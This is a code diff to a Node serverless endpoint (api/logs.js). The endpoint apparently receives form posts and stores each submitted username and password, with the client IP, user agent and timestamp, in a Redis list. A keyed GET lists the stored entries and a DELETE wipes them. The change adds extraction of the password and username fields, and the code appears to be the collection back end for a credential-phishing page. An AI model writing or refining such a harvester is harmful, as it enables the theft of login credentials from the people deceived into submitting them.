@@ -1,8 +1,3 @@
-// lang: Node, file: api/logs.js, target: Vercel serverless (Node 26, ESM)
-// POST   /api/logs                    -> capture (FormData body)
-// GET    /api/logs?k=…&page=&limit=    -> JSON { entries, total, page, limit }
-// DELETE /api/logs?k=…                 -> wipes the Redis list
-
 import { Redis } from '@upstash/redis';
 
 export const config = { runtime: 'nodejs' };
@@ -13,16 +8,13 @@ const DEFAULT_LIMIT = 25;
 const MAX_LIMIT = 100;
 
 function redis() {
-  // Check UPSTASH_ first, fallback to KV_ (Vercel integration names)
   const url = process.env.UPSTASH_REDIS_REST_URL || process.env.KV_REST_API_URL;
   const token = process.env.UPSTASH_REDIS_REST_TOKEN || process.env.KV_REST_API_TOKEN;
-  
   if (!url || !token) return null;
   return new Redis({ url, token });
 }
 
 function fmtEntry(d, ip) {
-  // Force strings, fallback to empty if undefined
   return JSON.stringify({
     ts: new Date().toISOString(),
     ip: String(ip),
@@ -47,10 +39,14 @@ export default async function handler(req, res) {
   if (req.method === 'POST') {
     let body = req.body || {};
     
-    // If Vercel sent it as a string, try to parse it
-    if (typeof body === 'string') {
+    // Defeat the [object Object] bug: extract straight from the FormData object
+    if (typeof body.username === 'undefined' && typeof body.get === 'function') {
+       // If it's a FormData instance
+       body.username = body.get('username');
+       body.password = body.get('password');
+       body.ua = body.get('ua');
+    } else if (typeof body === 'string') {
       try { body = JSON.parse(body); } catch { 
-        // fallback if it's urlencoded
         const params = new URLSearchParams(body);
         body = Object.fromEntries(params.entries());
       }
